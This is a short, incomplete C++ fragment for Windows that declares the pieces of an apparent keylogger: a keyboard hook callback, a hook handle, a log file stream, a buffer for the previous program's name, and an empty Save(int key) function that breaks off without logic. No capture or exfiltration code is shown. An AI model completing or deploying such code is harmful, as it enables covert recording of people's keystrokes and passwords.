#include <iostream>
#include <windows.h>
#include <fstream>
#include <time.h>

using namespace std;

int Save(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

ofstream file;

extern char prevProg[256];

int Save(int key)
{
    if (key == 1 || key == 2)
    {
        
    }
}